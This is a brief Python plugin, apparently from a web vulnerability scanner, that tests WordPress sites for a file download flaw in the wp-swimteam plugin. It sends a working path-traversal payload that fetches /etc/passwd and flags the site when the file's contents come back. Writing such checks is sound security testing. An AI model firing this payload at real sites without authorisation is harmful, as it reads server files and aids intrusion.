#!/usr/bin/env python
# -*- coding: utf-8 -*-

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload = "wp-content/plugins/wp-swimteam/include/user/download.php?file=/etc/passwd&filename=/etc/passwd&contenttype=text/html&transient=1&abspath=/usr/share/wordpress"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl(url)
    if code == 200 and 'root' in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])